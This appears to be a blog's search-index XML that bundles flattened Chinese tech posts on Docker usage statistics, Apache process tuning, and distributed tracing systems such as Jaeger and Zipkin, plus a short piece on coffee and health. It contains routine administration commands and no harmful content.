<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Writing-Email]]></title>
    <url>%2F2018%2F07%2F07%2FWriting-Email%2F</url>
    <content type="text"><![CDATA[摘要 参考文献 The 7 Emails You Need to Know How to Write | TEJU RAVILOCHAN June 5, 2014]]></content>
  </entry>
  <entry>
    <title><![CDATA[Language-React-lang]]></title>
    <url>%2F2018%2F07%2F07%2FLanguage-React-lang%2F</url>
    <content type="text"><![CDATA[摘要 Introduction | React 简介 React developer roadmap Core Concept | 核心概念Concept AConcept BConcept CArchitecture | React 架构Best Practice | React 最佳实践参考文献]]></content>
  </entry>
  <entry>
    <title><![CDATA[Learning-Template]]></title>
    <url>%2F2018%2F06%2F19%2FLearning-Template%2F</url>
    <content type="text"><![CDATA[摘要 范式1： 主题式Introduction | XX简介Core Concept | 核心概念Concept AConcept BConcept CArchitecture | XX架构Best Practice | XX最佳实践参考文献 Just-In-Case vs. Just-In-Time Learning Brains Cling to Old Habits When Learning New Tricks The Uncertainty Tax: the financial cost of not knowing things]]></content>
  </entry>
  <entry>
    <title><![CDATA[2018 Docker 用户报告 - Sysdig Edition]]></title>
    <url>%2F2018%2F06%2F12%2FDevOps-Container-Usage%2F</url>
    <content type="text"><![CDATA[摘要 应用排行榜 容器运行环境 容器编排器 容器监控 This article is part of an Virtualization Technology tutorial series. Make sure to check out my other articles as well: 2018 年度 Docker 用户报告 - Sysdig Edition Cyber-Security: Linux 容器安全的十重境界 DevOps漫谈：Docker ABC 根据 Sysdig 发表的年度 Docker 用户报告，在容器市场 Docker 仍然是事实上的行业标准，但是其它品牌的容器运行环境正在发展；Kubernetes 仍然是容器编排领域的王者。报告的数据来源主要依据 Sysdig Monitor 和 Sysdig Secure cloud service 提供的容器使用状况的实时快照报告，它们从容器健康、性能和安全性等方面提供度量指标和可视化服务。样本集包括垂直行业和各类规模不等的大中型企业，地域覆盖北美洲、拉丁美洲、EMEA（欧洲、中东、非洲）和亚太地区。与去年一样，这份报告并不是用来代表整个容器市场。因为数据仅限于 Sysdig 客户，所以对于那些选择商业和开源解决方案的公司来说不具有代表性。但是来自 90000 个容器用户汇总数据，确实提供了了解真实生产环境容器使用状况的独特视角。 2018 Docker 用户报告 - Sysdig Edition容器应用排行榜容器部署应用榜首：Java Virtual Machines (JVM)。在容器时代之前，Java 就广泛应用于企业级服务，目前两者 —— Java 和容器更加紧密地融合到了一起。 我们还看到数据库解决方案的使用在增加, 例如在容器环境中运行 PostgreSQL) 和 MongoDB 。这是一个信号, 表明在容器中部署有状态服务已经成为现实。容器的短暂性，让许多人对于在容器中运行高价值数据服务抱有怀疑态度, 但是市场回答了问题的解决方案–即为微服务设计的持久、便携和共享存储。数据显示, 客户开始转向完全由容器驱动的环境。 容器密度在2017年每个主机的容器数的中位数是 10 。2018年，这个数字上升到 15，同比增长 50% 。另一方面，我们看到一个客户的单台主机上运行了 154 个容器，比我们去年观察到的最大 95 个增长了。 容器运行环境 Docker still reigns, but we’re seeing what might be the first signs of cracks in the dam. 事实上的容器运行环境依然是Docker。我们在 2017 年的报告中没有提及其他容器运行环境的详细信息, 因为在当时 Docker 的占有率接近 99% 。但是, 鉴于最近的一些变化： Red Hat 收购 CoreOS 的 (RKT 的制造商)，以及 Open Container Initiative (OCI) 项目 — 旨在推进容器运行环境和镜像标准化。 事实上，在过去的一年里, 客户对其他平台的使用增加了。CoreOS RKT 显著增长到 12% , Mesos containerizer 占有 4% 。LXC 也在增长, 尽管从业人员规模比例还较低。数据显示, 客户在生产环境中使用 “non-Docker” 解决方案更加便利了。 容器存活周期95% 的容器存活时间低于一周。 容器和服务的生存时间是多少？ 我们观察了容器、容器镜像和服务的数量, 它们在短时间内开始并停止, 存活10秒或更短, 或者一周或更长。下图显示不同间隔内的容器百分比。 11% 的容器活了不到10秒。大部分容器（27%） 的生存期在五分钟之内。 为什么这么多的容器寿命如此之短呢？我们知道许多定制的系统都是按照需求来扩展的。容器被创建, 做他们的工作, 然后离开。例如, 一个客户为他们在 Jenkins 创建的每个作业配置一个容器，执行变更测试, 然后关闭容器。对他们来说, 类似活动每天会发生上千次。（Jenkins：一个用 Java 编写的开源持续集成工具，MIT许可证。它支持软件配置管理工具，如CVS、Subversion 和 Git 等，可以执行基于 Apache Ant 和 Apache Maven 的项目，以及任意的Shell 脚本/批处理命令。） 镜像存活周期我们还观察了容器镜像的使用时间。通过查看这些数据, 我们了解到客户在 DevOps CI/CD 流程的一部分中是如何频繁地进行新的容器更新部署的。 一小部分 – 一个百分点–在不到10秒内更新。69% 的容器镜像在一周的跨度内更新。 服务存活周期“服务的寿命是多少？” 在 Kubernetes 中, 服务抽象定义了一组提供特定函数以及如何访问它们的 Pods 。服务允许 Pods 在不影响应用程序的情况下注销和复制。例如, 一个群集可以运行一个 Node.js JavaScript 运行时服务、MySQL 数据库服务和 NGINX 前端服务。 我们看到大多数服务(67%)生存期超过一周。少量的服务在更频繁的基础上被停止, 但是对于大多数客户来说, 目标是让应用程序 24 小时持续工作。容器和 Pods 可能会来了又走, 但是服务持续处于启动并且可用状态。 容器编排器 First place goes to Kubernetes, followed by Kubernetes and then Kubernetes. 例如, Mesosphere 能够在 DC/OS 环境中部署和管理 “Kubernetes-as-a-service”。可以将多个 Kubernetes 群集部署在一个 Mesosphere 群集上。 今年 Docker Swarm 的排名上升到第二位, 超过了基于 Mesos 的工具。根据 Sysdig ServiceVision 我们能自动标识出是否使用编排器, 并将逻辑基础结构对象与容器度量关联起来。在 2018 年, Kubernetes 可以确保领先地位。 Swarm 的进入门槛例如, 微软使用 Kubernetes 为其 Azure Kubernetes 服务 (AKS), IBM 的云容器服务和私有云产品也是基于 Kubernetes 。即使是 Docker 和 Mesosphere 也增加支持了 Kubernetes 的功能。 Docker 企业版, 具有通用控制平面 (Universal Control Plane (UCP) ), 在许多操作层面上降低了启动 Swarm 的门槛。 容器集群大小 Mesos owns the big cluster game. ”集群大小对与组织选择编排器的影响是什么？“这项研究显示基于 Mesos 的编排器, 包括 Mesos Marathon 和 Mesosphere DC/OS 降至第三位。在使用 Mesos 的地方, 部署的容器数（中位数）比 Kubernetes 环境多 50% 。鉴于 Mesos 倾向于在大规模的容器和云部署, 所以这是有意义的。因此, 虽然 Mesos 集群的数量较少, 但是 Mesos 集群通常是意味着更大的企业规模。 我们的客户, 往往是更大的企业（在私有数据中心运行 Sysdig 解决方案）采用 OpenShift 的数量比我们的 SaaS 客户数量还要多。 Rancher Labs 于 2015 年出现, 为 Docker Swarm 和 Kubernetes 提供支持。直到 2017 年, Rancher （“大农场主”）才完全兼容 Kubernetes 作为其编排器。 Kubernetes 分发版今年我们分析了使用 Kubernetes 的“品牌”分布, 看看在使用的 Kubernetes 是开源版本, 或由特定供应商提供的软件包。我们发现开源 Kubernetes 继续占有最大的份额, 但是 OpenShift 似乎正在取得突破进展, Rancher 也占有了一些份额。 OpenShift 获得接受不应该是一个惊喜。Kubernetes 于 2014 年诞生于 Google , Red Hat 也发布了该平台的 OpenShift 分发版, 并提出了针对企业客户实现 Kubernetes 的目标。 容器健康与应用性能监控了解用户体验的四个“黄金信号” ：延迟（latency），流量（traffic），错误（errors）和饱和度（saturation）。响应时间（Response time）是配置最广泛的告警类型，紧随其后的是正常运行时间（uptime）和停机告警。基于主机的告警是最常用的，包括主要资源指标 - CPU ，内存和磁盘使用率等仍然被广泛使用。用户想知道托管 Docker 的服务器（物理机，虚拟机或云实例）是否处于资源紧张或达到容量上限的状态。这些告警的触发条件通常设置在利用率达到 80%-95％ 之间。 同时，出现了越来越多的以容器为中心的资源告警。最主要有两种风格： 1）资源利用率 2）容器数量 默认情况下容器没有资源限制 。鉴于客户越来越注意容器限制方面的告警，这意味着他们正在使用 Docker运行时配置来控制容器使用内存，CPU或磁盘I / O 的上限，用户希望知道何时会超出阈值，应用程序的性能风险需要处于可控状态。 对于容器数量来说，这个问题通常与用户至少需要 X 个给定类型的容器并运行以提供所需的服务级别有关，特别是在微服务部署中。例如，“我知道如果需要确保应用程序运行良好，至少有三个 NGINX 容器可用。如果任何一个有问题，我都想知道。” 基于编排的告警（Orchestration-focused alerts） 也越来越受欢迎。与我们 2017 年的报告类似，“Pod Restart Count” 位列榜首。在一个 Pod 中，一个或多个容器是定位相同、共同调度（通常作为微服务的一部分）。如果某个容器重新启动太频繁，则表示存在可能影响应用程序性能的问题。 Kubernetes 管理员也经常使用 基于事件的告警（ Event-based alerts ） 。与基于度量的告警相比，它的区别在于，监控程序需要查找环境中生成的事件消息，例如 Kurthnetes “CrashLoopBackoff” 条件 — 代表 Pod 反复失败或重启，或者“Liveness probe failed”，表示容器是否为活跃和运行。这些告警有助于 DevOps 工程师快速定位问题。 Http 错误可能表明软件或基础架构存在问题，最终会影响性能。 Alerts are not a one-size-fits-all approach. 告警不是一种万能的方法。有时需要设置基于指定范围的告警，无论是逻辑或物理实体，还是整个基础结构（注：Sysdig 通过标签实现）。 在 2018 年的研究中，用于确定告警范围的最常用标签与 Kubernetes 有关（Scoping by pods），命名空间（namespace）紧随其后。特定的容器范围（Container specific scoping）也很受欢迎，包括容器名称，容器镜像和容器 ID 。2018年再次名列榜首的是云服务提供商标签，通常针对“名称”，“环境”，“ID”和“区域”标签以区分开发、测试和生产资源，以及标记云数据中心的位置。 容器和基础设施自定义监控指标 There’s no one custom metrics format to rule them all. “在环境中运行容器的客户，使用自定义指标的比例是多少，都是哪些？” 55％ 的 Sysdig SaaS 用户使用与 Java 应用程序相关的 JMX 指标。这与我们看到的 Java 应用程序部署非常广泛的事实一致。 StatsD 占有 29％ 的份额，Prometheus 占有 20％ 的份额（预计这个数字会随着时间的推移而增长）。 容器注册 It’s a split decision - registries are critical but there’s no clear leader. 注册管理机构至关重要，但是目前没有明确的领导者。容器注册表（container registry）是任何容器部署的基本组件。市场上有许多解决方案：一些是公共的，一些是私有的，一些是作为服务提供，一些是作为本地软件（private registry）部署。 2018 年前三名中，Google Container Registry（GCR）的比例最高，其次是 Quay ,之后是 Docker和 Amazon Elastic Container Registry（ECR）。 GCR 和 ACR 都是完全基于云托管的（private Docker container registries）。Quay 和 Docker 既可以用作本地解决方案也可以在云中运行（注：Sysdig 的用户群只有 50％ 能够清楚地识别出容器注册方案） New approaches are maturing and helping organizations develop applications more quickly to solve real business challenges and compete in the digital marketplace. 扩展阅读: 网络安全专题合辑《Cyber-Security Manual》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞，争取安全上网 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 AgentNEO 架构简介 | 07 May 2018 用 Sysdig 监控服务器和 Docker 容器 | 曹元其 | 2016 年 7 月 15 日发布 使用 sysdig 进行监控和调试 linux 机器]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:应用性能分析]]></title>
    <url>%2F2018%2F06%2F11%2FLinux-Perf-App%2F</url>
    <content type="text"><![CDATA[摘要应用性能分析 Apache vs Nginx JVM vs Go 问题12#[Wed Jul 25 22:19:05 2018] [error] server reached MaxClients setting, consider raising the MaxClients setting 12345678910111213141516171819## 持续输出进程数$ watch "pgrep httpd | wc -l"Every 2.0s: pgrep httpd | wc -l Thu Jul 26 21:12:12 201842$ ps -ylC httpd --sort:rssS UID PID PPID C PRI NI RSS SZ WCHAN TTY TIME CMDS 501 37620 1 0 80 0 1268 11253 poll_s ? 00:14:17 httpdS 501 37622 37620 0 80 0 1708 11320 inet_c ? 00:00:00 httpdS 501 37623 37620 0 80 0 1708 11320 inet_c ? 00:00:00 httpdS 501 37624 37620 0 80 0 1708 11320 inet_c ? 00:00:00 httpdS 501 37625 37620 0 80 0 1708 11320 inet_c ? 00:00:00 httpd.....## 当前连接数$ netstat -an | grep :2003 | wc -l172# 累计消耗内存（M）$ ps aux|grep -v grep|awk '/httpd/&#123;sum+=$6;n++&#125;;END&#123;print sum/1024&#125;'# 平均每个进程消耗内存（M）$ ps aux|grep -v grep|awk '/httpd/&#123;sum+=$6;n++&#125;;END&#123;print sum/n/1024&#125;' Apache Server MPM 问题：为什么 Apache HTTP Server 启动有多个进程 多处理模块(Multi -Processing Modules，MPM) 12345678$ ./httpd -VServer version: Apache/2.2.31 (Unix)......Architecture: 64-bitServer MPM: Prefork threaded: no forked: yes (variable process count)Server compiled with.... Prefork 工作模式 123456789//httpd.conf 默认配置&lt;IfModule prefork.c&gt; StartServers 8 # 服务初始化的工作进程数（work process）MinSpareServers 5 # 保持的最少空闲进程数MaxSpareServers 20 # 保持的最大空闲进程数ServerLimit 256 # 保持的最大活动进程数，设定MaxClients的上限值MaxClients 256 # 最大并发连接数MaxRequestsPerChild 4000 # 每个子进程在生命周期能服务的最大请求数,即控制每个进程在处理了多少次请求之后自动销毁&lt;/IfModule&gt; Worker 工作模式 123456789//httpd.conf 默认配置&lt;IfModule worker.c&gt;StartServers 4 # 初始化的子进程数MaxClients 300 # 并发请求最大数MinSpareThreads 25 # 最小空闲线程数total=所有进程的线程数加起来MaxSpareThreads 75 # 最大空闲线程数ThreadsPerChild 25 # 每个子进程可生成的线程数MaxRequestsPerChild 100 # 每个子进程可服务的最大请求数,0表示不限制,建议设置为非0&lt;/IfModule&gt; Event 工作模式 Apache vs. NginxJVM vs. Go App扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 Java 应用性能调优实践 动态追踪技术-应用性能瓶颈排障利器之火焰图 Apache的三种MPM模式比较：prefork，worker，event Apache HTTP Server 中prefork和worker工作模式（二） Sites are very slow. Apache shows: server reached MaxClients setting on Plesk for Linux]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux-FileSystems]]></title>
    <url>%2F2018%2F06%2F07%2FLinux-FileSystems%2F</url>
    <content type="text"><![CDATA[摘要参考文献 创建和挂载 Oracle Solaris 文件系统]]></content>
  </entry>
  <entry>
    <title><![CDATA[TeamWork-Project-Risk]]></title>
    <url>%2F2018%2F06%2F05%2FTeamWork-Project-Risk%2F</url>
    <content type="text"><![CDATA[摘要 绪论概念 What is Risk ? 风险是损失或收益发生的不确定性。风险通常指一定时期内，某一事件的预期结果与实际结果的变动程度，变动程度越大，风险越大。 How to Manage RiskRisk Management FrameworkRisk Management PlanRisk IdentificationRisk Response PlanningManaging Risk throughout the OrganizationRisk AnalysisRisk Efficiency measurementRisk MetricsRisk Audit参考文献 维基百科：Project risk management 10 GOLDEN RULES OF PROJECT RISK MANAGEMENT | ~ By Bart Jutte Risk analysis and management | a vital key to effective project management | 3 March 2008 Lavanya, N. | Malarvizhi, T.]]></content>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈:分布式追踪系统体系概要]]></title>
    <url>%2F2018%2F05%2F18%2FDevOps-OpenTracing%2F</url>
    <content type="text"><![CDATA[摘要 Key Words: metrics、logging、tracing Google Dapper Family : Uber Jaeger、淘宝 EagleEye、微博 Watchman、京东 CallGraph、美团 MTrace 数据可视化 | Exporters This article is part of an Distributed Tracing and Monitoring System tutorial series. Make sure to check out my other articles as well: DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 绪论讨论分布式追踪技术，首先需要明确的是：什么是跟踪 ？ metrics度量（metrics）的特征是聚合: 它们是在一段时间内组成单一逻辑标尺、计数器或直方图的跨度。例如：HTTP 请求的数量可以建模为计数器(counter）, 其更新逻辑很简单，只需通过加法聚合; 如果设定一段持续的观察时间，请求数可以被建模成一个直方图。《基于Ganglia实现服务集群性能态势感知》 介绍的就是以记录度量为主的故障监控系统。 logging日志（logging）的特征是处理离散事件。按照事件发生的源可以分为 Application Events、System Events、Service Events、DNS Events 等。通常也包含针对原始记录的处理过程，例如：通过 Syslog 将应用程序调试或错误消息发送到 Elasticsearch ; 审计记录通过 Kafka 将数据推送到类似 BigTable 的数据池; 从服务调用中提取特定的请求元数据, 并发送错误跟踪服务（例如 NewRelic）。 tracing跟踪（tracing）的特征：跟踪处理的是请求范围内的信息（request-scoped），例如 SQL 语句在数据库的实际执行时间或 HTTP 请求耗时。以 DTrace &amp; SystemTap 为代表的 动态追踪技术 基于操作系统内核，不需要埋点就可以提供高级性能分析和调试功能。但是在分布式架构场景中也有一些不足，例如某些功能需要多次调用 RPC 远程服务，这些服务分布在多台不同的 host/vm/docker 中，如果需要测量该功能响应的完整持续时间就有难度。 示例（Use OpenCensus with OpenZipkin）OpenCensus 作为埋点 API ，导出 tracing data 到 OpenZipkin，由 Zipkin 的 Web UI 提供数据展示和交互能力，可以很清晰地看到函数调用顺序和耗时。从理解系统行为的角度上说，与动态追踪技术中的火焰图（flame graph）有异曲同工之妙。 串行调用函数方法，包括网络访问和持久化操作 示例（OpenCensus with OpenZipkin）：并行调用函数方法（Go routine） Google Dapper Family讨论分布式跟踪，就一定会谈到 Dapper —— Google 公司研发并应用于自己生产环境的一款跟踪系统（设计之初参考了一些 Magpie 和 X-Trace 的理念 ）。Dapper 不仅为业内提供了非常有参考价值的实现，同步发表论文的也成为了当前分布式跟踪系统的重要理论基础。Google Dapper 的理念影响了一批分布式跟踪系统的发展，例如 2012 年，Twitter 公司严格按照 Dapper 论文的要求实现了 Zipkin （Scala 编写，集成到 Twitter 公司自己的分布式服务 Finagle ）；Uber 公司基于 Google Dapper 和 Twitter Zipkin 的灵感，开发了开源分布式跟踪系统 Jaeger。 《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure|Google Technical Report dapper-2010-1, April 2010》 OpenTracing 通过提供平台无关、厂商无关的API，使得开发人员能够方便的添加（或更换）追踪系统的实现。 OpenTracing 提供了用于运营支撑系统的和针对特定平台的辅助程序库。除了 API 之外，一个完整的分布式追踪系统还需要包括数据存储、支持代理转发、用户友好的 WebUI 等特性，例如：Zipkin 专注于 tracing 领域；Prometheus 开始专注于 metrics，同时可能会发展更多的 tracing 功能，但不太可能深入 logging 领域；基于 ELK 之类的日志系统专注于 logging 领域，但也可能集成其他领域的特性。总之，各式各样的分布式追踪系统都是以 tracing 为基础，同时根据自己的需要在其他两个领域各有所侧重而已。 Uber JaegerUber Jaeger 是 Uber 工程团队开源的分布式追踪系统。自 2016年 起，Jaeger 在 Uber 内部实现大范围应用。Uber 同时开发了一种适用于 RPC 的网络多路复用和框架协议 —— TChannel | Support: Node.js,Python,Go,Java，该协议融入了分布式追踪能力。 TChannel 协议规范在二进制格式中直接定义了追踪字段：“ spanid:8 parentid:8 traceid:8 traceflags:1 ”。 jaeger-client：支持多种语言的客户端库，如Go, Java, Python等语言 jaeger-agent：客户端代理负责将追踪数据转发到服务端，这样能方便应用的快速处理，同时减轻服务端的直接压力；另外可以在客户端代理动态调整采样的频率，进行追踪数据采样的控制 jaeger-collector：数据收集器主要进行数据收集和处理，从客户端代理收集数据进行处理后持久化到数据存储中 数据存储：目前支持将收集到的数据持久化到 Cassandra 、 Elasticsearch jaeger-query：主要根据不同的条件到数据存储中进行搜索，支撑前端页面的展示 jaeger-ui：一个基于 React 的前端 webui jaeger spark: 是一个基于 Spark 聚合数据管道，用以完成服务依赖分析 淘宝 EagleEye（鹰眼）EagleEye（鹰眼） 是Google 的分布式调用跟踪系统 Dapper 在淘宝的实现。主要特点是通过每台应用机器上的 Agent 实时抓取 EagleEye 日志，按照日志类型不分别处理： 全量原始日志直接存储到 HDFS ；创建 MapReduce 任务完成调用链合并、分析和统计； 有实时标记的原始日志存储到 HBase ； 业务日志：一部分会被直接处理存储到 HBase，有一部分会作为消息发送出去，由特定的业务系统订阅处理； 调用实时统计，提供分钟级别的实时链路调用视图，辅助故障定位。 国内其他衍生系统 微博 Watchman：微博平台的链路追踪及服务质量保障系统。watchman-aspect 组件通过异步日志（async-logger）在各个节点上输出日志文件；以流式的方式处理数据，watchman-prism 组件（基于 Scribe），将日志推送到 watchman-stream 组件（基于Storm）, 根据需求进行聚合、统计等计算（针对性能数据），规范化、排序（针对调用链数据），之后写入 HBase 。 京东 CallGraph：全局 TraceID 的调用链。核心包（完成埋点逻辑，日志存放在内存磁盘上由 Agent 收集发送到JMQ）、JMQ（日志数据管道）、Storm（对数据日志并行整理和计算）、存储（实时数据存储JimDB/HBase/ES，离线数据存储包括HDFS和Spark）、CallGraph-UI（用户交互界面）、UCC（存放配置信息并同步到各服务器）、管理元数据（存放链路签名与应用映射关系等）。日志格式：固定部分（TraceID、RpcID、开始时间、调用类型、对端IP、调用耗时、调用结果等）、可变部分。 美团 MTrace：美团点评内部的分布式会话跟踪系统。基于全局 TraceID 的调用链，客户端与后端服务之间有一层 Kafka，实现两边工程的解耦。实时数据主要使用 Hbase ，traceID 作为 RowKey；离线数据主要使用 Hive，可以通过 SQL 进行一些结构化数据的定制分析。 CN105224445B | WO2017071134A1 | 分布式追踪系统| 北京汇商融通信息技术有限公司 | 2015-10-28 不完全统计 名称 原理 客户端 依赖分析 存储 可视化 Google Dapper TraceID —– —– —– —– OpenTracing TraceID go,java,python,js,objective-c,c++ —– —– —– OpenCensus TraceID go,java,python,C++,.Net,js,Erlang —– —– no web-ui,Support Exporter Uber Jaeger TraceID java,go,python Support Agent Proxy Spark Cassandra、ES React Web-ui 淘宝 EagleEye（鹰眼） TraceID yes MapReduce HDFS(全量) HBase(实时) yes 微博 Watchman 日志 watchman-aspect Storm HBase yes 京东 CallGraph TraceID Agent-&gt;JMQ Storm JimDB（实时）ES、Spark（离线） yes 美团 MTrace TraceID Agent-&gt; Kafka Support Agent Proxy Storm HBase(实时) Hive(离线) yes Exporters | 数据可视化Prometheus|普罗米修斯Stackdriver适用于 Google Cloud Platform 与 AWS 应用的监控、日志记录和诊断工具 SignalFXAmazon AWS X-RayZipkinZipkin 的 Span 模型几乎完全仿造了 Dapper 中的 Span 设计，Zipkin 的 Span 包括基础数据（traceId、spanId、parentId、name、timestamp 和 duration，主要用于表示跟踪树中节点的关联关系）、 Annotation（记录请求特定事件相关信息）、BinaryAnnotation（扩展信息）。 Zipkin 包括四大组件： Zipkin Collector: 处理跟踪数据的守护进程 (validate,store,index)； Storage: 设计之初支持 Cassandra 存储（Twitter 广泛应用），目前也支持 ElasticSearch 和 MySQL； Zipkin Query Service: JSON API； Web UI: 没有内置身份认证。 扩展阅读 | Distributed Tracing with Zipkin and ELK 1234567891011121314151617181920212223242526272829303132$ docker image pull openzipkin/zipkin$ docker container run -p 9411:9411 openzipkin/zipkin ******** ** ** * * ** ** ** ** ** ** ** ** ******** **** **** **** **** ****** **** *** **************************************************************************** ******* **** *** **** **** ** ** ***** ** ***** ** ** ** ** ** ** ** ** * *** ** **** ** ** ** ***** **** ** ** *** ****** ** ** ** ** ** ** **:: Powered by Spring Boot :: (v2.0.1.RELEASE)$ docker container ls --allCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESf9935fcaf4ba openzipkin/zipkin "/bin/sh -c 'test -n" 5 seconds ago Up 4 seconds 9410/tcp, 0.0.0.0:9411-&gt;9411/tcp musing_jepsen 扩展阅读 | Tracing microservices with Zipkin and Kibana OpenCensus vs OpenTracing Future OpenTracing OpenCensus Google Dapper API 支持 Go、 Python、Javascript、 Objective-CJava、C++ 研发中：PHP 、Ruby Go、Java、C++、.Net，Node.js，Erlang 研发中： Python(STATS In Progress) 、 PHP(STATS Planned) 、 Ruby(STATS Planned) – EXPORTERS – SignalFX (Java、C++) Prometheus (Java、C++、Go、Erlang) Jaeger (Java、Go) Stackdriver (Java、C++、Go、Python、ERLANG-Trace Only) Zipkin (Java、C++、Go、Erlang) Instana (Java) – OpenCensus ROADMAP What is distributed tracing. Zoom on opencensus and opentracing What&#39;s the difference between opencensus and opentracing?&mdash; #GoldenBlackChild 🌟🏆🏅🥇 (@nevi_me) January 17, 2018 Sensor Sensibility FormatThe Sensor Sensibility Format — or SSF for short — is a language agnostic format for transmitting observability data such as trace spans, metrics, events and more. https://github.com/stripe/veneur/tree/master/ssf 管理负载 Managing Tracing Overhead目前多数分布式追踪系统采用异步写入日志、建立缓冲存储（基于内存或者内存数据库）、设置采样阈值策略（包括一定情况下直接丢弃）的方式控制追踪负载。Google Dapper 公布的性能损耗测评数据如下： 淘宝 EagleEye ：1）专属日志输出实现，日志异步写入来避免 hang 住业务线程，可调节日志输出缓冲大小，控制每秒写日志的 IO 次数等。2）全局采样开关，在运行期控制调用链的采样率（根据 TraceId 来决定当前的这一次访问日志是否输出）。比如采样率被设置为 10，一部分调用链日志完全不输出，只有 hash(traceId) mod 10 的值等于0的日志才会输出。例如核心入口的调用量样本空间足够大（每日百万次以上级别），假设统计误差 0.1% ，即使开启1/10的采样总和误差也是可以接受的。 微博 Watchman：如某个服务由于瞬时访问高峰，造成底层资源压力变大从而服务响应时间变长，控制策略可以根据设定随机丢弃后续的请求，如果情况加剧就会自动降级该服务，保证核心服务路径。 扩展阅读：分布式追踪系统 DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 扩展阅读：开源架构技术漫谈 基于Go语言快速构建一个RESTful API服务 基于Kafka构建事件溯源型微服务 数据可视化（七）Graphite 体系结构详解 DevOps 资讯 | LinkedIn 开源 Kafka Monitor 参考文献 OpenTraing 文档 | 中文 The difference between tracing, tracing, and tracing Using OpenTracing with Istio/Envoy 优步分布式追踪技术再度精进 开放分布式追踪（OpenTracing）入门与 Jaeger 实现 Github | CNCF Jaeger, a Distributed Tracing System OpenTracing: Jaeger as Distributed Tracer Distributed tracing at Pinterest with new open source tools Instrumenting a Go application with Zipkin 分布式跟踪系统（一）：Zipkin的背景和设计 分布式调用跟踪系统调研笔记 Node.js Performance and Highly Scalable Micro-Services - Chris Bailey, IBM 分布式会话跟踪系统架构设计与实践 | 美团点评技术团队 | 志桐 ·2016-10-14 18:13 Metrics, tracing, and logging | 2017 02 21 跟踪 skynet 服务间的消息请求及性能分析 | 云风的Blog]]></content>
      <tags>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嗑药简史：咖啡上瘾，喝还是不喝？]]></title>
    <url>%2F2018%2F05%2F14%2FAddiction-Decision-Coffee%2F</url>
    <content type="text"><![CDATA[摘要 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 Finder 和 MacWrite还是有很多缺陷。Randy Wigginton带了一大袋巧克力咖啡豆和一堆含有咖啡因的饮料来帮我们对付接下来几天的瞌睡虫。我们每过几个小时就更新软件版本，每解决一个重大的缺陷就发布一次。—— Andy Hertzfeld. 《硅谷革命：成就苹果公司的疯狂往事》 嗑药简史：咖啡上瘾，喝还是不喝？对于一种历史上曾不被信任的饮料，咖啡被证明是一种健康的上瘾（healthy addiction）。 早在 20 世纪 80 年代，挪威研究人员的报告中就已经提出咖啡似乎可以抵御肝脏疾病。从那时起，已经有研究显示深褐色饮料出对肝癌、二型糖尿病、心脏病和中风等具有保健价值。咖啡甚至可以预防抑郁症（depression）、帕金森病（Parkinson）和阿尔茨海默病（Alzheimer）。总的来说，研究结果非常惊人。美国研究人员在 2012 年报告说，一天喝两杯或更多杯咖啡的人比不喝咖啡的人长寿。日本、苏格兰和芬兰的研究结论也是如此。 咖啡因（caffeine）具有轻微成瘾性。咖啡不仅能让你振作起来，也可能会使你的情绪低落。目前，咖啡依然被很多人视为不利健康。它可能是世界上消费最广泛的饮料之一，但是人们一直认为，至少具有咖啡因活性的咖啡仍然有问题。“人们注意到咖啡因，” 心脏病学家 Arthur Klatsky 说，他在 Kaiser Permanente （位于加利福尼亚州·奥克兰）研究咖啡几十年。“大众通常认为，任何对神经系统有影响的东西都会有坏的东西。” 在 20 世纪 70 年代的研究中，咖啡怀疑者表示咖啡有心脏病风险。也有传言说它可能阻碍生长或致癌。没错，咖啡对某些人来说有负面影响，但并不包括上述担忧。 